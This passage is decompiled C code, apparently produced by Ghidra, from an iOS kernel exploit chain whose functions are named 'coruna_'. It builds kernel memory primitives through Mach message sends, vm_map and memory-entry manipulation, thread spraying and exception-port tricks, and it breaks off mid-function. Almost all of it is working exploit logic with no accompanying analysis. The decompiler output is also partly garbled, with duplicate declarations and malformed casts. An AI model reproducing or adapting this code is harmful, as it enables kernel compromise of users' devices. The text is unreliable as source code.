    *(uint64_t *)(addr + 8 + handle) = *(uint64_t *)(addr_2 + handle);
    handle = handle + 8;
  } while (handle != 0xf0);
  *(uint64_t *)(addr + 0x100) = off_4;
  *(uint64_t *)(handle + 0xdc) = *(uint64_t *)(handle + 0x168);
  u = *(uint64_t *)(addr_2 + 0x80);
  size = *(uint64_t *)(addr_2 + 0x88);
  *(uint64_t *)(addr + 0x108) = val;
  *(int *)(addr + 0x110) = (int)id_2;
  *(uint64_t *)(addr + 0xf8) = size_3;
  *(uint64_t *)(addr + 0x88) = u;
  *(uint64_t *)(addr + 0x90) = size;
  coruna_mach_msg_send(handle,*(uint64_t *)(handle + 0x168),val,id_2,size_3,u);
  *(uint64_t *)(handle + 0xdc) = *(uint64_t *)(handle + 0x178);
  return;
}
void coruna_kernel6544_via_kernel09_via_mach_msg_send(long handle,uint64_t val,long addr_2)
{
  unsigned long u;
  uint size;
  unsigned long version;
  
  version = *(unsigned long *)(handle + 0x178);
  *(unsigned long *)(addr_2 + 0xa8) = version;
  if (*(long *)(handle + 0x270) != 0) {
    size = *(uint *)(handle + 0x28c);
    version = (unsigned long)size;
    if ((size & 3) == 0) {
      version = (unsigned long)size & 0xff000000;
      u = 0x77d3;
      if ((int)version != 0) {
        u = version | 0x77d3000000000000;
      }
      version = 0x77d3;
      if ((size & 8) == 0) {
        version = u;
      }
    }
  }
  if (*(long *)(handle + 0x278) != 0) {
    version = (unsigned long)*(byte *)(handle + 0x28c);
  }
  coruna_kernel09_via_mach_msg_send(version,handle,val,*(uint32_t *)(handle + 0x290),*(long *)(handle + 0x270),
               *(long *)(handle + 0x278),addr_2);
  return;
}
void coruna_kernel6544_via_kernel09_via_mach_msg_send_2(long handle,uint64_t val,uint size,long addr_2)
{
  void (*ptr)(void);
  long handle;
  long addr;
  unsigned long u;
  unsigned long unaff_x30;
  long scratch [31];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0x1b] = 0;
  scratch[0x1a] = 0;
  scratch[0x1d] = 0;
  scratch[0x1c] = 0;
  scratch[0x17] = 0;
  scratch[0x16] = 0;
  scratch[0x19] = 0;
  scratch[0x18] = 0;
  scratch[0x13] = 0;
  scratch[0x12] = 0;
  scratch[0x15] = 0;
  scratch[0x14] = 0;
  scratch[0xf] = 0;
  scratch[0xe] = 0;
  scratch[0x11] = 0;
  scratch[0x10] = 0;
  scratch[0xb] = 0;
  scratch[10] = 0;
  scratch[0xd] = 0;
  scratch[0xc] = 0;
  scratch[7] = 0;
  scratch[6] = 0;
  scratch[9] = 0;
  scratch[8] = 0;
  scratch[3] = 0;
  scratch[2] = 0;
  scratch[5] = 0;
  scratch[4] = 0;
  scratch[1] = 0;
  scratch[0] = 0;
  handle = *(long *)(handle + 0x278);
  addr = handle;
  if (handle == 0) {
    addr = 0;
  }
  if (0 < (int)size) {
    u = 0;
    do {
      if (((uint)u < 8) || ((uint)u == 0xf)) {
        scratch[u] = *(long *)(addr_2 + u * 8);
      }
      else {
        coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),addr,*(uint64_t *)(addr_2 + u * 8),1);
        addr = addr + 8;
      }
      u = u + 1;
    } while (size != u);
    handle = *(long *)(handle + 0x278);
  }
  scratch[0x13] = *(long *)(handle + 0x298) + 0xefe8;
  scratch[0x15] = *(uint64_t *)(handle + 0x178);
  scratch[0x17] = *(long *)(handle + 0x298) + 0xef80;
  coruna_kernel09_via_mach_msg_send(handle,val,*(uint32_t *)(handle + 0x294),k_kernel_rodata_word_40038,handle,scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf000);
    return;
  }
  ___stack_chk_fail(*(uint64_t *)(handle + 8));
}





void coruna_kernel09_residual_258(long *handle,uint64_t val,uint64_t *id_2)
{
  long handle;
  uint64_t *scratch;
  long bootargs [30];
  
  handle = 0;
  bootargs[0x1d] = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs[0x1c] = 0;
  bootargs[0x19] = 0;
  bootargs[0x18] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x15] = 0;
  bootargs[0x14] = 0;
  bootargs[0x17] = 0;
  bootargs[0x16] = 0;
  bootargs[0x11] = 0;
  bootargs[0x10] = 0;
  bootargs[0x13] = 0;
  bootargs[0x12] = 0;
  bootargs[0xd] = 0;
  bootargs[0xc] = 0;
  bootargs[0xf] = 0;
  bootargs[0xe] = 0;
  bootargs[9] = 0;
  bootargs[8] = 0;
  bootargs[0xb] = 0;
  bootargs[10] = 0;
  bootargs[5] = 0;
  bootargs[4] = 0;
  bootargs[7] = 0;
  bootargs[6] = 0;
  bootargs[1] = 0;
  bootargs[0] = 0;
  bootargs[3] = 0;
  bootargs[2] = 0;
  scratch = id_2;
  do {
    *(uint64_t *)((long)bootargs + handle) = *scratch;
    handle = handle + 8;
    scratch = scratch + 1;
  } while (handle != 0xe8);
  (**(void (**)(*handle + 8))(handle,val,0x1d,bootargs);
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs[0x1d]) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_kernel6544_via_kernel6544_via_nop_stub_6_2(long handle,uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  long scratch [17];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t action;
  uint64_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  scratch[0xf] = 0;
  scratch = 0;
  stack_guard = 0;
  action = 0;
  block_ctx = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  scratch[0] = *(long *)(handle + 0x298) + 0xf000;
  scratch[0x10] = val;
  bootargs = id_2;
  coruna_kernel6544_via_kernel09_via_mach_msg_send(handle,k_kernel_rodata_word_40020,scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot != sa_saved) {
    ___stack_chk_fail(*(uint64_t *)(handle + 8));
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf000);
  return;
}





void coruna_ret_stub(long *handle,uint64_t val)
{
  (**(void (**)(*handle + 0x10))(handle,val,0);
  return;
}





void coruna_kernel6544_via_kernel6544_via_nop_stub_6_2_2(long handle,uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  unsigned long unaff_x30;
  long scratch [17];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t action;
  uint64_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  scratch[0xf] = 0;
  scratch = 0;
  stack_guard = 0;
  action = 0;
  block_ctx = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  scratch[0] = *(long *)(handle + 0x298) + 0xf100;
  scratch[0x10] = val;
  bootargs = id_2;
  coruna_kernel6544_via_kernel09_via_mach_msg_send(handle,k_kernel_rodata_word_40028,scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot != sa_saved) {
    ___stack_chk_fail(*(uint64_t *)(handle + 8));
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf100);
  return;
}





void coruna_kernel6544_via_kernel6544_via_nop_stub_6_2_3(long *handle,uint64_t val,uint64_t id_2)
{
  long scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = handle[0x53] + 0xefd8;
  bootargs = 0;
  bootargs = 0;
  thread_attr = 0;
  thread_attr = 0;
  scratch = id_2;
  (**(void (**)(*handle + 8))(handle,k_kernel_rodata_word_40018,6,&scratch);
  coruna_kernel6544_via_nop_stub_6_2(handle[1],handle[0x53] + 0xf100);
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_kernel6544_residual_245(long *handle,uint64_t val)
{
  long handle;
  uint64_t *ptr;
  uint64_t scratch[17];
  long bootargs;
  
  handle = 0;
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xb] = 0;
  scratch[10] = 0;
  scratch[0xd] = 0;
  scratch[0xc] = 0;
  scratch[7] = 0;
  scratch[6] = 0;
  scratch[9] = 0;
  scratch[8] = 0;
  scratch[3] = 0;
  scratch[2] = 0;
  scratch[5] = 0;
  scratch[4] = 0;
  scratch[1] = 0;
  scratch[0] = 0;
  ptr = (uint64_t *)ghidra_reg_4;
  do {
    *(uint64_t *)((long)scratch + handle) = *ptr;
    handle = handle + 8;
    ptr = ptr + 1;
  } while (handle != 0x40);
  scratch[0xf] = val;
  (**(void (**)(*handle + 8))(handle,k_kernel_rodata_word_40000,0x10,scratch);
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_helper_caac_1c948(long handle)
{
  (**(void (**)(handle + 0x10))();
  return;
}
uint64_t coruna_thread_set_exception_ports(long *handle)
{
  long *ptr;
  uint u;
  thread_act_t target_act;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  vm_address_t lv6;
  vm_address_t lv7;
  uint tag;
  mach_port_t lm9;
  int err;
  long handle;
  long addr;
  long off;
  unsigned long kind;
  long base;
  unsigned long type_id;
  long ctx_val;
  long serial;
  uint64_t type_id_8;
  long serial_7;
  mach_msg_header_t *msg;
  void *buf;
  uint8_t *ptr;
  int status;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  long serial_8;
  long serial_9;
  uint64_t type_id_12;
  long *str;
  unsigned long type_id_13;
  task_t *copy;
  unsigned long offset;
  vm_inherit_t inheritance;
  uint64_t in_stack_fffffffffffff950;
  vm_address_t scratch;
  uint8_t *bootargs;
  uint64_t thread_attr;
  void (*host_info)(void);
  uint8_t *serial_buf;
  long *action;
  long *block_ctx;
  semaphore_t stack_guard;
  semaphore_t sa_saved;
  natural_t sa_new [68];
  uint8_t *path_buf;
  uint64_t tmp_buf;
  void (*region)(void);
  uint8_t *plist;
  long *url_buf;
  long json_buf;
  unsigned long frame;
  unsigned long work;
  long cache;
  vm_size_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint cache_23;
  mem_entry_name_port_t cache_24;
  vm_address_t cache_25;
  uint64_t cache_26;
  uint64_t scratch;
  uint8_t *cache_27;
  uint64_t cache_28;
  void (*cache_29)(void);
  uint8_t *cache_30;
  long *cache_31;
  thread_act_t *cache_32;
  long *cache_33;
  semaphore_t cache_34;
  semaphore_t cache_35;
  pthread_t cache_36;
  long cache_37;
  vm_address_t cache_38;
  vm_address_t cache_39;
  thread_act_t cache_40;
  thread_act_t cache_41;
  mem_entry_name_port_t cache_42;
  vm_address_t cache_43;
  vm_size_t cache_44;
  uint64_t *cache_45;
  uint cache_46;
  semaphore_t cache_47;
  semaphore_t cache_48;
  thread_act_t cache_49;
  thread_act_t cache_50;
  uint64_t cache_51;
  uint64_t bootargs;
  uint64_t cache_52;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t cache_53;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t cache_54;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t cache_55;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t cache_56;
  uint64_t url_buf;
  uint64_t json_buf;
  long cache_57;
  uint64_t cache_58;
  uint64_t frame;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_59;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_60;
  uint64_t cache_23;
  uint64_t cache_61;
  uint64_t cache_24;
  long cache_62 [34];
  
  ptr = k_kernel_mach_task_self_slot;
  cache_62[0x20] = *(long *)k_kernel_stack_chk_guard_slot;
  str = handle + 1;
  status = *(int *)(*(long *)(*str + 0x20) + 0x140);
  cache_50 = 0;
  _thread_create(*(task_t *)k_kernel_mach_task_self_slot,&cache_50);
  cache_49 = 0;
  _thread_create(*(task_t *)ptr,&cache_49);
  cache_48 = 0;
  _semaphore_create(*(task_t *)ptr,&cache_48,0,0);
  cache_47 = 0;
  _semaphore_create(*(task_t *)ptr,&cache_47,0,0);
  cache_46 = 0;
  handle = coruna_kernel6544_via_ctx_test_flag_9(*(uint64_t *)(*str + 0x20),0,&cache_46);
  do {
    ptr = k_kernel_mach_task_self_slot;
    cache_45 = (uint64_t *)0x0;
    cache_44 = 0x4000;
    cache_43 = 0;
    _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&cache_43,0xc000,0,1,0,0,0,0,2,
            (vm_inherit_t)in_stack_fffffffffffff950);
    cache_45 = (uint64_t *)(cache_43 + 0x4000);
    _vm_allocate(*(vm_map_t *)ptr,(vm_address_t *)&cache_45,cache_44,0x4000);
    *cache_45 = 0xc0c0c0c0c0c0c0c0;
    _mach_make_memory_entry(*(vm_map_t *)ptr,&cache_44,(vm_offset_t)cache_45,3,&cache_42,0);
    addr = coruna_call_thread_switch_1aa90_19a80(*str,cache_42);
    off = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(*str,addr + 0x10);
    off = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(*str,off + 0x18);
    kind = coruna_kernel6544_residual_217(*str,off + 0x3c);
    if ((int)kind < 0) {
      serial_7 = (kind & 0x7fffffff) * 0x30;
    }
    else {
      serial_7 = ((kind & 0xffffffff) << ((unsigned long)cache_46 & 0x3f)) + handle;
    }
    base = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(*str,serial_7 + 0x20);
    tag = coruna_kernel6544_residual_217(*str,serial_7);
  } while (-1 < (int)tag);
  kind = 0;
  type_id_10 = base + (unsigned long)tag * -0x30 + 0x1800000000;
  base = handle[1];
  type_id_11 = *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(base + 0x20));
  type_id_13 = *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(base + 0x20));
  do {
    serial_8 = type_id_10 + (kind & 0xfffffff0);
    type_id = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(base,serial_8 + 0x18);
    if ((type_id_11 <= type_id && type_id < type_id_13) && (type_id & 0x3fff) == 0) {
      type_id = coruna_kernel6544_residual_217(handle[1],serial_8 + 0x20);
      handle[4] = type_id & 0xffffffff;
      if ((int)type_id != 0) {
        if ((int)type_id < 0) {
          base = type_id_10 + (type_id & 0x7fffffff) * 0x30;
        }
        else {
          base = ((type_id & 0xffffffff) << ((unsigned long)cache_46 & 0x3f)) + handle;
        }
        tag = coruna_kernel6544_residual_217(*str,base + 0x30);
        if (0xfff < tag) {
          coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(*str,addr + 0x18,0,1);
          coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(*str,addr + 0x20,0xffffffffffffc000,1);
          copy = (task_t *)k_kernel_mach_task_self_slot;
          cache_41 = 0;
          err = 0x100;
          do {
            _thread_create(*copy,&cache_41);
            port = k_kernel_rodata_word_3b378;
            version = k_kernel_rodata_word_0003b218;
            size = k_kernel_rodata_word_3b210;
            type_id_12 = k_kernel_rodata_word_0003b208;
            type_id_8 = k_kernel_rodata_word_3b200;
            err = err + -1;
          } while (err != 0);
          tag = 0;
          cache_40 = 0;
          off = off + 0x30;
          kind = serial_7 - handle;
          do {
            _thread_create(*copy,&cache_40);
            *(uint32_t *)(handle + 0x54) = 0;
            type_id_13 = coruna_call_thread_switch_1aa90_19a80(handle[1],cache_40);
            addr = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],k_kernel_rodata_word_40008 + type_id_13);
            type_id = coruna_kernel6544_via_ctx_test_flag_3(*(uint64_t *)(handle[1] + 0x20),addr);
            type_id_11 = type_id + 0x110;
            offset = type_id & 0xffffffffffffc000;
            ptr = (uint8_t *)(type_id & 0x3fff);
            if ((type_id_11 & 0x3f) != 0x10 && ptr < &UNK_00003ec1) {
              cache_39 = 0;
              cache_24 = 0;
              cache_61 = 0;
              cache_23 = 0;
              cache_60 = 0;
              coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
              cache_23 = coruna_u64_pack(((int)handle[4]), ((uint32_t))cache_23);
              coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
              _vm_map(*copy,&cache_39,0x4000,0,1,cache_42,type_id_13 & 0xffffffffffffc000,0,3,1,
                      (vm_inherit_t)base);
              cache_24 = 0;
              cache_61 = 0;
              cache_23 = 0;
              cache_60 = 0;
              coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
              cache_23 = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_46 & 0x3f))), ((uint32_t))cache_23);
              coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
              lv7 = cache_39;
              serial_8 = k_kernel_rodata_word_40008;
              cache_38 = 0;
              cache_24 = 0;
              cache_61 = 0;
              cache_23 = 0;
              cache_60 = 0;
              coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
              cache_23 = coruna_u64_pack(((int)handle[4]), ((uint32_t))cache_23);
              coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
              _vm_map(*copy,&cache_38,0x4000,0,1,cache_42,offset,0,3,1,(vm_inherit_t)base);
              cache_24 = 0;
              cache_61 = 0;
              cache_23 = 0;
              cache_60 = 0;
              coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
              cache_23 = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_46 & 0x3f))), ((uint32_t))cache_23);
              coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
              lv6 = cache_38;
              cache_37 = 0;
              cache_62[0x1f] = 0;
              cache_62[0x1e] = 0;
              cache_62[0x1d] = 0;
              cache_62[0x1c] = 0;
              cache_62[0x1b] = 0;
              cache_62[0x1a] = 0;
              cache_62[0x19] = 0;
              cache_62[0x18] = 0;
              cache_62[0x17] = 0;
              cache_62[0x16] = 0;
              cache_62[0x15] = 0;
              cache_62[0x14] = 0;
              cache_62[0x13] = 0;
              cache_62[0x12] = 0;
              cache_62[0x11] = 0;
              cache_62[0x10] = 0;
              cache_62[0xf] = 0;
              cache_62[0xe] = 0;
              cache_62[0xd] = 0;
              cache_62[0xc] = 0;
              cache_62[0xb] = 0;
              cache_62[10] = 0;
              cache_62[9] = 0;
              cache_62[8] = 0;
              cache_62[7] = 0;
              cache_62[6] = 0;
              cache_62[5] = 0;
              cache_62[4] = 0;
              cache_62[3] = 0;
              cache_62[2] = 0;
              cache_62[1] = 0;
              cache_62[0] = 0;
              cache_27 = k_kernel_nsconcretestackblock_slot;
              cache_28 = port;
              cache_29 = coruna_thread_terminate;
              cache_30 = &k_kernel_rodata_word_3c888;
              cache_34 = cache_47;
              cache_35 = cache_48;
              cache_31 = &cache_37;
              cache_32 = &cache_40;
              cache_33 = cache_62;
              _pthread_create(&cache_36,(pthread_attr_t *)0x0,(void **)coruna_helper_caac_1c948,&cache_27);
              _semaphore_wait(cache_48);
              lm9 = _pthread_mach_thread_np(cache_36);
              scratch = type_id_12;
              cache_26 = type_id_8;
              _thread_policy_set(lm9,2,(thread_policy_t)&cache_26,4);
              ctx_val = coruna_call_thread_switch_1aa90_19a80(handle[1],lm9);
              if (tag == 0) {
                type_id_9 = 0xfc;
                do {
                  err = coruna_kernel6544_residual_217(*str,ctx_val + type_id_9 + 4);
                  u = tag;
                  if (err == (int)cache_26) {
                    err = coruna_kernel6544_residual_217(*str,ctx_val + type_id_9 + 8);
                    if (err == cache_26) {
                      err = coruna_kernel6544_residual_217(*str,ctx_val + type_id_9 + 0xc);
                      u = (int)type_id_9 + 4;
                      if (err != (int)scratch) {
                        u = tag;
                      }
                    }
                  }
                  tag = u;
                  type_id_9 = type_id_9 + 4;
                } while (type_id_9 < 0x2fc);
              }
              ptr = (long *)(lv7 + (type_id_13 & 0x3fff) + serial_8);
              coruna_call_mach_vm_machine_attribute(handle[1],ctx_val + (unsigned long)tag + 4,1,1);
              scratch = version;
              cache_26 = size;
              lm9 = _mach_thread_self();
              _thread_policy_set(lm9,2,(thread_policy_t)&cache_26,4);
              serial_8 = handle[1];
              lm9 = _mach_thread_self();
              serial_8 = coruna_call_thread_switch_1aa90_19a80(serial_8,lm9);
              serial_8 = serial_8 + (unsigned long)tag;
              coruna_call_mach_vm_machine_attribute(handle[1],serial_8,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(handle[1],serial_8 + 4,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(handle[1],serial_8 + 8,0x7fffffff,1);
              coruna_call_mach_vm_machine_attribute(handle[1],serial_8 + 0xc,0x100,1);
              coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(handle[1],serial_8 + 0x10,0xfffffffffffffff,1);
              _semaphore_signal(cache_47);
              ptr[-1] = 0;
              serial_8 = *(long *)(ptr + lv6 + 0x128);
              u = 0x400204;
              if ((*(uint *)(ptr + lv6 + 0x110) & 0x1000) != 0) {
                u = 0x400208;
              }
              *(uint *)((long)handle + 0x294) = u;
              *(uint *)(handle + 0x52) = u | 0x3c0;
              *(uint *)(ptr + lv6 + 0x110) = u | 0x3c0;
              if (status < 0x2712) {
                *ptr = 0;
              }
              _thread_switch(0,0,0);
              cache_37 = 1;
              do {
                if (*ptr != 0) {
                  serial_9 = ptr[-1];
                  ctx_val = coruna_kernel6544_via_ctx_test_flag_3(*(uint64_t *)(*str + 0x20));
                  if (ctx_val == serial_9) {
                    *ptr = addr;
                    goto fail;
                  }
                }
              } while (cache_37 == 1);
              serial_9 = 0;
fail:
              _pthread_join(cache_36,(void **)0x0);
              if (status < 0x2712) {
                *ptr = serial_9;
              }
              ctx_val = 0;
              do {
                if ((*(int *)((long)cache_62 + ctx_val) != 0) &&
                   (type_id_9 = coruna_call_thread_switch_1aa90_19a80(*str), type_id_9 == type_id_13)) {
                  cache_37 = 3;
                  *(uint32_t *)(handle + 0x54) = *(uint32_t *)((long)cache_62 + ctx_val);
                  *(uint32_t *)((long)cache_62 + ctx_val) = 0;
                  break;
                }
                ctx_val = ctx_val + 4;
              } while (ctx_val != 0x100);
              ctx_val = *(long *)(ptr + lv6 + 0x128);
              if ((serial_8 != ctx_val && ctx_val != 0) && cache_37 == 3) {
                status = *(int *)(*(long *)(*str + 0x20) + 0x140);
                err = coruna_ctx_test_flag(*(long *)(*str + 0x20),0x5584201);
                if (0x225b < status) {
                  serial_9 = 0xb8;
                  if (err != 0) {
                    serial_9 = 0x70;
                  }
                  serial_9 = serial_9 + (type_id_13 & 0x3fff);
                  tag = *(uint *)(serial_9 + cache_39);
                  if ((tag >> 0xf & 1) == 0) {
                    *(uint *)(cache_39 + serial_9) = tag | 0x8000;
                  }
                }
                status = 0x100;
                do {
                  _thread_create(*(task_t *)k_kernel_mach_task_self_slot,&cache_41);
                  if (cache_41 != 0) {
                    serial_9 = coruna_call_thread_switch_1aa90_19a80(*str);
                    serial = coruna_ptr_canonicalize(*(uint64_t *)(*str + 0x20),serial_9);
                    if (serial != 0) {
                      coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(*str,serial_9 + k_kernel_rodata_word_40008 + -8,0,1);
                      _thread_terminate(cache_41);
                      cache_41 = 0;
                    }
                  }
                  status = status + -1;
                } while (status != 0);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(*str,type_id_13 + k_kernel_rodata_word_40008 + -8,type_id,1);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874_c100(*str,k_kernel_rodata_word_40008 + type_id_13,addr,1);
                type_id_13 = coruna_kernel6544_residual_217(*str,base);
                if ((int)type_id_13 < 0) {
                  type_id_13 = type_id_10 + (type_id_13 & 0x7fffffff) * 0x30;
                }
                else {
                  type_id_13 = ((type_id_13 & 0xffffffff) << ((unsigned long)cache_46 & 0x3f)) + handle;
                }
                type_id_9 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(*str,type_id_13 + 0x18);
                while (type_id_9 != offset) {
                  type_id_13 = coruna_kernel6544_residual_217(*str,type_id_13 + 8);
                  if ((int)type_id_13 < 0) {
                    type_id_13 = type_id_10 + (type_id_13 & 0x7fffffff) * 0x30;
                  }
                  else {
                    type_id_13 = ((type_id_13 & 0xffffffff) << ((unsigned long)cache_46 & 0x3f)) + handle;
                  }
                  type_id_9 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(*str,type_id_13 + 0x18);
                }
                if (type_id_13 < type_id_10) {
                  type_id_10 = type_id_13 - handle >> ((unsigned long)cache_46 & 0x3f);
                }
                else {
                  type_id_10 = (type_id_13 - type_id_10) / 0x30 | 0x80000000;
                }
                cache_25 = 0;
                cache_24 = 0;
                cache_61 = 0;
                cache_23 = 0;
                cache_60 = 0;
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
                cache_23 = coruna_u64_pack(((int)handle[4]), ((uint32_t))cache_23);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
                _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&cache_25,0x4000,0,1,cache_42,
                        offset,0,3,1,(vm_inherit_t)base);
                cache_24 = 0;
                cache_61 = 0;
                cache_23 = 0;
                cache_60 = 0;
                coruna_call_call_mach_vm_machine_attribute_29df8_1d654(handle[1],off,&cache_60,0x20,1);
                cache_23 = coruna_u64_pack(((int)(kind >> ((unsigned long)cache_46 & 0x3f))), ((uint32_t))cache_23);
                coruna_call_call_mach_vm_machine_attribute_29df8_21874(handle[1],off,&cache_60,0x20,1);
                handle[3] = (long)(ptr + cache_25);
                coruna_call_mach_vm_machine_attribute(handle[1],type_id_11,(int)handle[0x52],1);
                _memcpy(&cache_60,(void *)handle[3],0x130);
                type_id_8 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],serial_7);
                cache_21 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],type_id_13 + 8);
                path_buf = k_kernel_nsconcretestackblock_slot;
                tmp_buf = port;
                region = coruna_mach_make_memory_entry_dd90;
                plist = &k_kernel_rodata_word_3c8a8;
                cache_20 = cache_44;
                cache_23 = cache_46;
                cache_24 = cache_42;
                url_buf = handle;
                json_buf = serial_7;
                frame = type_id_10;
                work = type_id_13;
                cache = handle;
                cache_22 = type_id_8;
                handle = coruna_call_thread_switch_1aa90_19a80(handle[1],cache_49);
                type_id_12 = *(uint64_t *)(handle[1] + 0x20);
                type_id_8 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],k_kernel_rodata_word_40008 + handle);
                handle = coruna_kernel6544_via_ctx_test_flag_4(type_id_12,type_id_8);
                handle[0x2d] = handle;
                handle = coruna_call_thread_switch_1aa90_19a80(handle[1],cache_50);
                type_id_12 = *(uint64_t *)(handle[1] + 0x20);
                type_id_8 = coruna_call_call_mach_vm_machine_attribute_29df8_1d654_c0cc(handle[1],k_kernel_rodata_word_40008 + handle);
                handle = coruna_kernel6544_via_ctx_test_flag_4(type_id_12,type_id_8);
                handle[0x2f] = handle;
                handle = coruna_mach_port_allocate_c374(handle,0x10000);
                handle[0x53] = handle;
                sa_new[0x3e] = 0;
                sa_new[0x3f] = 0;
                sa_new[0x3c] = 0;
                sa_new[0x3d] = 0;
                sa_new[0x42] = 0;
                sa_new[0x43] = 0;
                sa_new[0x40] = 0;
                sa_new[0x41] = 0;
                sa_new[0x36] = 0;
                sa_new[0x37] = 0;
                sa_new[0x34] = 0;
                sa_new[0x35] = 0;
                sa_new[0x3a] = 0;
